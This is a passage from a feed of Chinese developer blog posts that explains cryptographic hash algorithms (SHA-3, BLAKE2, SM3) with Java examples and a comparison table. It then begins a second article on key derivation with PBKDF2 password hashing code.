    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">sha3_512</span><span class="hljs-params">(String input)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">MessageDigest</span> <span class="hljs-variable">md</span> <span class="hljs-operator">=</span> MessageDigest.getInstance(<span class="hljs-string">"SHA3-512"</span>);
        <span class="hljs-type">byte</span>[] hashBytes = md.digest(input.getBytes(StandardCharsets.UTF_8));
        <span class="hljs-keyword">return</span> bytesToHex(hashBytes);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">bytesToHex</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> {
        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span> b : bytes) {
            sb.append(String.format(<span class="hljs-string">"%02x"</span>, b));
        }
        <span class="hljs-keyword">return</span> sb.toString();
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">String</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-string">"测试数据"</span>;
        System.out.println(<span class="hljs-string">"输入: "</span> + input);
        System.out.println(<span class="hljs-string">"SHA3-256: "</span> + sha3_256(input));
        System.out.println(<span class="hljs-string">"SHA3-512: "</span> + sha3_512(input));
        
        <span class="hljs-comment">// 注意：SHA-3需要Java 9+，且需要支持SHA-3的提供者</span>
    }
}
</code></pre>
<h3 data-id="heading-29">安全建议</h3>
<p>✅ <strong>适用场景：</strong></p>
<ul>
<li>需要与SHA-2不同的算法结构</li>
<li>后量子密码学考虑</li>
<li>新项目可以考虑使用</li>
</ul>
<p>⚠️ <strong>注意：</strong></p>
<ul>
<li>Java 9+支持</li>
<li>性能稍低于SHA-256</li>
<li>目前SHA-256仍然是最广泛使用的选择</li>
</ul>
<hr/>
<h2 data-id="heading-30">BLAKE2</h2>
<h3 data-id="heading-31">原理</h3>
<p>BLAKE2是SHA-3竞赛的决赛算法之一，基于ChaCha流密码设计。有两个变体：BLAKE2b（64位）和BLAKE2s（32位）。</p>
<h3 data-id="heading-32">技术规格</h3>























<table><thead><tr><th>变体</th><th>输出长度</th><th>块大小</th><th>优势</th></tr></thead><tbody><tr><td>BLAKE2b</td><td>1-512位</td><td>128字节</td><td>64位平台优化</td></tr><tr><td>BLAKE2s</td><td>1-256位</td><td>64字节</td><td>32位平台优化</td></tr></tbody></table>
<h3 data-id="heading-33">应用场景</h3>
<ol start="0">
<li><strong>高性能场景</strong>：需要比SHA-256更快</li>
<li><strong>密码存储</strong>：Argon2使用BLAKE2b</li>
<li><strong>文件校验</strong>：某些文件传输工具</li>
<li><strong>区块链</strong>：某些加密货币</li>
</ol>
<h3 data-id="heading-34">性能影响</h3>
<ul>
<li><strong>计算速度</strong>：非常快（比SHA-256快）</li>
<li><strong>内存占用</strong>：低</li>
<li><strong>CPU使用率</strong>：低</li>
<li><strong>吞吐量</strong>：高于SHA-256</li>
</ul>
<h3 data-id="heading-35">Java实现示例</h3>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 注意：Java标准库不包含BLAKE2</span>
<span class="hljs-comment">// 需要使用第三方库，如Apache Commons Codec或BouncyCastle</span>
​
<span class="hljs-keyword">import</span> org.bouncycastle.jcajce.provider.digest.Blake2b;
<span class="hljs-keyword">import</span> org.bouncycastle.util.encoders.Hex;
<span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;
​
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BLAKE2Example</span> {
    
    <span class="hljs-comment">/**
     * BLAKE2b哈希
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">String</span> <span class="hljs-title">blake2b</span><span class="hljs-params">(<span class="hljs-type">String</span> input)</span> </span>{
        Blake2b.Digest digest = <span class="hljs-keyword">new</span> Blake2b.<span class="hljs-built_in">Digest</span>(<span class="hljs-number">256</span>); <span class="hljs-comment">// 256位输出</span>
        <span class="hljs-type">byte</span>[] hashBytes = digest.<span class="hljs-built_in">digest</span>(input.<span class="hljs-built_in">getBytes</span>(StandardCharsets.UTF_8));
        <span class="hljs-keyword">return</span> Hex.<span class="hljs-built_in">toHexString</span>(hashBytes);
    }
    
    <span class="hljs-comment">/**
     * BLAKE2b自定义输出长度
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">String</span> <span class="hljs-title">blake2b</span><span class="hljs-params">(<span class="hljs-type">String</span> input, <span class="hljs-type">int</span> outputLength)</span> </span>{
        Blake2b.Digest digest = <span class="hljs-keyword">new</span> Blake2b.<span class="hljs-built_in">Digest</span>(outputLength * <span class="hljs-number">8</span>);
        <span class="hljs-type">byte</span>[] hashBytes = digest.<span class="hljs-built_in">digest</span>(input.<span class="hljs-built_in">getBytes</span>(StandardCharsets.UTF_8));
        <span class="hljs-keyword">return</span> Hex.<span class="hljs-built_in">toHexString</span>(hashBytes);
    }
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">String</span>[] args)</span> </span>{
        <span class="hljs-type">String</span> input = <span class="hljs-string">"测试数据"</span>;
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"输入: "</span> + input);
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"BLAKE2b-256: "</span> + <span class="hljs-built_in">blake2b</span>(input));
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"BLAKE2b-512: "</span> + <span class="hljs-built_in">blake2b</span>(input, <span class="hljs-number">64</span>));
    }
}
</code></pre>
<h3 data-id="heading-36">安全建议</h3>
<p>✅ <strong>适用场景：</strong></p>
<ul>
<li>需要高性能哈希</li>
<li>密码派生函数（Argon2）</li>
<li>对性能有较高要求的场景</li>
</ul>
<p>⚠️ <strong>注意：</strong></p>
<ul>
<li>需要第三方库支持</li>
<li>不如SHA-256广泛支持</li>
</ul>
<hr/>
<h2 data-id="heading-37">SM3 (国密算法)</h2>
<h3 data-id="heading-38">原理</h3>
<p>SM3是中国国家密码管理局发布的密码哈希算法，输出256位哈希值，基于Merkle-Damgård结构。</p>
<h3 data-id="heading-39">技术规格</h3>

























<table><thead><tr><th>属性</th><th>值</th></tr></thead><tbody><tr><td>输出长度</td><td>256位 (32字节)</td></tr><tr><td>块大小</td><td>512位</td></tr><tr><td>安全级别</td><td>高（国密标准）</td></tr><tr><td>状态</td><td>国密标准</td></tr></tbody></table>
<h3 data-id="heading-40">应用场景</h3>
<ol start="0">
<li><strong>政府系统</strong>：符合国密要求</li>
<li><strong>金融行业</strong>：国内银行、支付</li>
<li><strong>信创项目</strong>：国产化替代</li>
<li><strong>数字签名</strong>：与SM2结合使用</li>
</ol>
<h3 data-id="heading-41">性能影响</h3>
<ul>
<li><strong>计算速度</strong>：快（与SHA-256相当）</li>
<li><strong>内存占用</strong>：低</li>
<li><strong>CPU使用率</strong>：低</li>
</ul>
<h3 data-id="heading-42">Java实现示例</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.bouncycastle.jce.provider.BouncyCastleProvider;
<span class="hljs-keyword">import</span> java.security.MessageDigest;
<span class="hljs-keyword">import</span> java.security.Security;
<span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;
​
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SM3Example</span> {
    
    <span class="hljs-keyword">static</span> {
        Security.addProvider(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BouncyCastleProvider</span>());
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">hash</span><span class="hljs-params">(String input)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">MessageDigest</span> <span class="hljs-variable">md</span> <span class="hljs-operator">=</span> MessageDigest.getInstance(<span class="hljs-string">"SM3"</span>, <span class="hljs-string">"BC"</span>);
        <span class="hljs-type">byte</span>[] hashBytes = md.digest(input.getBytes(StandardCharsets.UTF_8));
        <span class="hljs-keyword">return</span> bytesToHex(hashBytes);
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">bytesToHex</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> {
        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();
        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span> b : bytes) {
            sb.append(String.format(<span class="hljs-string">"%02x"</span>, b));
        }
        <span class="hljs-keyword">return</span> sb.toString();
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">String</span> <span class="hljs-variable">input</span> <span class="hljs-operator">=</span> <span class="hljs-string">"测试数据"</span>;
        System.out.println(<span class="hljs-string">"输入: "</span> + input);
        System.out.println(<span class="hljs-string">"SM3: "</span> + hash(input));
        System.out.println(<span class="hljs-string">"长度: "</span> + hash(input).length() + <span class="hljs-string">" 字符 (256位)"</span>);
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-43">性能对比</h2>
<h3 data-id="heading-44">哈希算法性能对比表</h3>





























































<table><thead><tr><th>算法</th><th>输出长度</th><th>速度</th><th>硬件加速</th><th>推荐度</th></tr></thead><tbody><tr><td>SHA-256</td><td>256位</td><td>快</td><td>有</td><td>⭐⭐⭐⭐⭐</td></tr><tr><td>SHA-512</td><td>512位</td><td>快</td><td>有</td><td>⭐⭐⭐⭐</td></tr><tr><td>SHA3-256</td><td>256位</td><td>中等</td><td>少</td><td>⭐⭐⭐⭐</td></tr><tr><td>BLAKE2b</td><td>可变</td><td>很快</td><td>无</td><td>⭐⭐⭐⭐</td></tr><tr><td>SM3</td><td>256位</td><td>快</td><td>少</td><td>⭐⭐⭐⭐</td></tr><tr><td>SHA-1</td><td>160位</td><td>快</td><td>有</td><td>❌</td></tr><tr><td>MD5</td><td>128位</td><td>快</td><td>有</td><td>❌</td></tr></tbody></table>
<h3 data-id="heading-45">性能优化建议</h3>
<ol start="0">
<li><strong>选择SHA-256</strong>：性能与安全性最佳平衡</li>
<li><strong>大文件哈希</strong>：使用流式处理，避免一次性加载</li>
<li><strong>并行处理</strong>：大文件可以分块并行哈希</li>
<li><strong>硬件加速</strong>：某些CPU支持SHA指令加速</li>
</ol>
<hr/>
<h2 data-id="heading-46">哈希算法的应用模式</h2>
<h3 data-id="heading-47">密码哈希（不使用纯哈希）</h3>
<p>❌ <strong>错误方式：</strong></p>
<pre><code class="hljs language-ini" lang="ini">String <span class="hljs-attr">passwordHash</span> = SHA256.hash(password)<span class="hljs-comment">; // 不安全！</span>
</code></pre>
<p>✅ <strong>正确方式：</strong></p>
<pre><code class="hljs language-ini" lang="ini">// 使用PBKDF2、bcrypt、Argon2等专门算法
String <span class="hljs-attr">passwordHash</span> = PBKDF2.hash(password, salt, iterations)<span class="hljs-comment">;</span>
</code></pre>
<h3 data-id="heading-48">数据完整性验证</h3>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// 文件传输完整性</span>
<span class="hljs-type">String</span> fileHash = SHA256.<span class="hljs-built_in">hashFile</span>(file);
<span class="hljs-comment">// 存储哈希值，验证时重新计算并比较</span>
</code></pre>
<h3 data-id="heading-49">数字指纹</h3>
<pre><code class="hljs language-ini" lang="ini">// 生成数据唯一标识
String <span class="hljs-attr">fingerprint</span> = SHA256.hash(data)<span class="hljs-comment">;</span>
</code></pre>
<h3 data-id="heading-50">去重</h3>
<pre><code class="hljs language-ini" lang="ini">// 非安全场景的数据去重
Set&lt;String&gt; <span class="hljs-attr">hashSet</span> = new HashSet&lt;&gt;()<span class="hljs-comment">;</span>
String <span class="hljs-attr">hash</span> = SHA256.hash(data)<span class="hljs-comment">;</span>
if (!hashSet.contains(hash)) {
    // 新数据
}
</code></pre>
<hr/>
<h2 data-id="heading-51">总结</h2>
<h3 data-id="heading-52">推荐选择</h3>
<p><strong>通用场景：</strong></p>
<ul>
<li><strong>首选</strong>：SHA-256（最广泛使用）</li>
<li><strong>高安全</strong>：SHA-384 或 SHA-512</li>
</ul>
<p><strong>特殊场景：</strong></p>
<ul>
<li><strong>高性能需求</strong>：BLAKE2b</li>
<li><strong>国密合规</strong>：SM3</li>
<li><strong>新项目考虑</strong>：SHA3-256</li>
</ul>
<p><strong>不应使用：</strong></p>
<ul>
<li>❌ MD5</li>
<li>❌ SHA-1</li>
</ul>
<h3 data-id="heading-53">选择决策树</h3>
<pre><code class="hljs">需要哈希算法？
├─ 需要国密合规？→ SM3
├─ 性能优先？→ BLAKE2b
├─ 通用场景？→ SHA-256
└─ 高安全需求？→ SHA-384/512
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[加密与签名技术之密钥派生与密码学随机数]]></title>    <link>https://juejin.cn/post/7579512734297686054</link>    <guid>https://juejin.cn/post/7579512734297686054</guid>    <pubDate>2025-12-04T03:38:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579512734297686054" data-draft-id="7579567346390925338" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="加密与签名技术之密钥派生与密码学随机数"/> <meta itemprop="keywords" content="后端,算法"/> <meta itemprop="datePublished" content="2025-12-04T03:38:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Stream"/> <meta itemprop="url" content="https://juejin.cn/user/4132429930956443"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            加密与签名技术之密钥派生与密码学随机数
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4132429930956443/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Stream
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T03:38:39.000Z" title="Thu Dec 04 2025 03:38:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">概述</h2>
<p>密钥派生函数（KDF）用于从密码、主密钥或其他密钥材料派生加密密钥。密码学安全的随机数生成器用于生成密钥、IV等随机值。</p>
<h2 data-id="heading-1">目录</h2>
<ol start="0">
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">PBKDF2</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">bcrypt</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">scrypt</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">Argon2</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">HKDF</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">密码学随机数生成器</a></li>
</ol>
<hr/>
<h2 data-id="heading-2">PBKDF2</h2>
<h3 data-id="heading-3">原理</h3>
<p>PBKDF2 (Password-Based Key Derivation Function 2) 使用迭代哈希从密码派生密钥。通过增加迭代次数提高安全性。</p>
<p><strong>算法：</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">DK</span> = PBKDF2(PRF, Password, Salt, c, dkLen)
</code></pre>
<h3 data-id="heading-4">技术规格</h3>

























<table><thead><tr><th>属性</th><th>值</th></tr></thead><tbody><tr><td>迭代次数</td><td>建议10000+（2024年建议100000+）</td></tr><tr><td>Salt长度</td><td>至少64位（推荐128位）</td></tr><tr><td>输出长度</td><td>可变</td></tr><tr><td>PRF</td><td>HMAC-SHA1, HMAC-SHA256等</td></tr></tbody></table>
<h3 data-id="heading-5">应用场景</h3>
<ol start="0">
<li><strong>密码存储</strong>：从密码派生哈希值</li>
<li><strong>密钥派生</strong>：从主密钥派生子密钥</li>
<li><strong>加密密钥生成</strong>：从用户密码派生加密密钥</li>
</ol>
<h3 data-id="heading-6">性能影响</h3>
<ul>
<li><strong>计算速度</strong>：慢（设计如此，抗暴力破解）</li>
<li><strong>内存占用</strong>：低</li>
<li><strong>CPU使用率</strong>：高（迭代次数多）</li>
<li><strong>可调性</strong>：通过迭代次数调整安全性与性能</li>
</ul>
<h3 data-id="heading-7">Java实现示例</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> javax.crypto.SecretKeyFactory;
<span class="hljs-keyword">import</span> javax.crypto.spec.PBEKeySpec;
<span class="hljs-keyword">import</span> java.security.SecureRandom;
<span class="hljs-keyword">import</span> java.security.spec.KeySpec;
<span class="hljs-keyword">import</span> java.util.Base64;
​
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PBKDF2Example</span> {
    
    <span class="hljs-comment">/**
     * PBKDF2密钥派生（用于密码哈希）
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PasswordHash</span> {
        <span class="hljs-keyword">public</span> String hash;
        <span class="hljs-keyword">public</span> String salt;
        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> iterations;
        
        <span class="hljs-keyword">public</span> <span class="hljs-title function_">PasswordHash</span><span class="hljs-params">(String hash, String salt, <span class="hljs-type">int</span> iterations)</span> {
            <span class="hljs-built_in">this</span>.hash = hash;
            <span class="hljs-built_in">this</span>.salt = salt;
            <span class="hljs-built_in">this</span>.iterations = iterations;
        }
    }
    
    <span class="hljs-comment">/**
     * 生成密码哈希
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> PasswordHash <span class="hljs-title function_">hashPassword</span><span class="hljs-params">(String password, <span class="hljs-type">int</span> iterations)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 生成随机Salt</span>
        <span class="hljs-type">SecureRandom</span> <span class="hljs-variable">random</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecureRandom</span>();
        <span class="hljs-type">byte</span>[] salt = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>]; <span class="hljs-comment">// 128位Salt</span>
        random.nextBytes(salt);
        
        <span class="hljs-comment">// PBKDF2 with HMAC-SHA256</span>
        <span class="hljs-type">SecretKeyFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> SecretKeyFactory.getInstance(<span class="hljs-string">"PBKDF2WithHmacSHA256"</span>);
        <span class="hljs-type">KeySpec</span> <span class="hljs-variable">spec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PBEKeySpec</span>(password.toCharArray(), salt, iterations, <span class="hljs-number">256</span>);
        <span class="hljs-type">byte</span>[] hash = factory.generateSecret(spec).getEncoded();
        
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PasswordHash</span>(
            Base64.getEncoder().encodeToString(hash),
            Base64.getEncoder().encodeToString(salt),
            iterations
        );
    }
    
    <span class="hljs-comment">/**
     * 验证密码
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">verifyPassword</span><span class="hljs-params">(String password, PasswordHash stored)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">byte</span>[] salt = Base64.getDecoder().decode(stored.salt);
        
        <span class="hljs-type">SecretKeyFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> SecretKeyFactory.getInstance(<span class="hljs-string">"PBKDF2WithHmacSHA256"</span>);
        <span class="hljs-type">KeySpec</span> <span class="hljs-variable">spec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PBEKeySpec</span>(password.toCharArray(), salt, stored.iterations, <span class="hljs-number">256</span>);
        <span class="hljs-type">byte</span>[] hash = factory.generateSecret(spec).getEncoded();
        
        <span class="hljs-type">String</span> <span class="hljs-variable">computedHash</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(hash);
        <span class="hljs-keyword">return</span> computedHash.equals(stored.hash);
    }
    
    <span class="hljs-comment">/**
     * 派生加密密钥
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] deriveKey(String password, <span class="hljs-type">byte</span>[] salt, <span class="hljs-type">int</span> iterations, <span class="hljs-type">int</span> keyLength) 
            <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">SecretKeyFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> SecretKeyFactory.getInstance(<span class="hljs-string">"PBKDF2WithHmacSHA256"</span>);
        <span class="hljs-type">KeySpec</span> <span class="hljs-variable">spec</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PBEKeySpec</span>(password.toCharArray(), salt, iterations, keyLength * <span class="hljs-number">8</span>);
        <span class="hljs-keyword">return</span> factory.generateSecret(spec).getEncoded();
    }
    
    <span class="hljs-comment">/**
     * 完整示例
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> <span class="hljs-string">"用户密码123"</span>;
        
        System.out.println(<span class="hljs-string">"=== PBKDF2密码哈希 ==="</span>);
        <span class="hljs-type">PasswordHash</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> hashPassword(password, <span class="hljs-number">100000</span>);
        System.out.println(<span class="hljs-string">"密码: "</span> + password);
        System.out.println(<span class="hljs-string">"Salt: "</span> + hash.salt);
        System.out.println(<span class="hljs-string">"迭代次数: "</span> + hash.iterations);
        System.out.println(<span class="hljs-string">"哈希: "</span> + hash.hash);
        
        System.out.println(<span class="hljs-string">"\n=== 密码验证 ==="</span>);
        <span class="hljs-type">boolean</span> <span class="hljs-variable">isValid</span> <span class="hljs-operator">=</span> verifyPassword(password, hash);
        System.out.println(<span class="hljs-string">"验证结果: "</span> + isValid);
        <span class="hljs-type">boolean</span> <span class="hljs-variable">isInvalid</span> <span class="hljs-operator">=</span> verifyPassword(<span class="hljs-string">"错误密码"</span>, hash);
        System.out.println(<span class="hljs-string">"错误密码验证: "</span> + isInvalid);
        
        System.out.println(<span class="hljs-string">"\n=== 派生加密密钥 ==="</span>);
        <span class="hljs-type">byte</span>[] salt = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">16</span>];
        <span class="hljs-type">SecureRandom</span> <span class="hljs-variable">random</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecureRandom</span>();
        random.nextBytes(salt);
        <span class="hljs-type">byte</span>[] key = deriveKey(password, salt, <span class="hljs-number">100000</span>, <span class="hljs-number">32</span>); <span class="hljs-comment">// 256位密钥</span>
        System.out.println(<span class="hljs-string">"派生密钥长度: "</span> + key.length + <span class="hljs-string">" 字节 (256位)"</span>);
        
